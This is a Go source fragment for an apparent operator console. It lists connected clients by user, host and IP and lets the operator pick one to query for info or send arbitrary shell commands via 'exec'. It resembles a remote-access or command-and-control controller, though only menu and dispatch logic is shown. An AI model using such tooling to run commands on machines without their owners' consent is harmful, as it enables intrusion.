package main

import (
	"bufio"
	"fmt"
	"strings"
)

func handleList(reader *bufio.Reader) {
	for {
		clientsMutex.Lock()
		if len(clients) == 0 {
			fmt.Println("No clients connected.")
			clientsMutex.Unlock()
			return
		}

		fmt.Println("\n--- CLIENTS SNAPSHOT ---")
		ids := []string{}
		i := 1
		for sid, c := range clients {
			fmt.Printf("%d: %s@%s (%s)\n", i, c.user, c.host, c.ip)
			ids = append(ids, sid)
			i++
		}
		clientsMutex.Unlock()

		fmt.Print("> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		if input == "q" {
			return
		}
		if input == "u" {
			continue
		}

		idx := -1
		fmt.Sscanf(input, "%d", &idx)
		if idx < 1 || idx > len(ids) {
			fmt.Println("Invalid selection.")
			continue
		}
		clientID := ids[idx-1]
		handleClientMenu(reader, clientID)
		return
	}
}

func handleClientMenu(reader *bufio.Reader, clientID string) {
	clientsMutex.Lock()
	client, ok := clients[clientID]
	clientsMutex.Unlock()
	if !ok {
		fmt.Println("Client disconnected.")
		return
	}

	for {
		fmt.Printf("\nManaging client %s@%s (%s)\n> ", client.user, client.host, client.ip)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch {
		case input == "q":
			return
		case input == "info":
			sendInfoCommand(client)
		case strings.HasPrefix(input, "exec "):
			sendExecCommand(client, strings.TrimPrefix(input, "exec "))
		default:
			fmt.Println("Unknown command. Available: info, exec <command>, q")
		}
	}
}
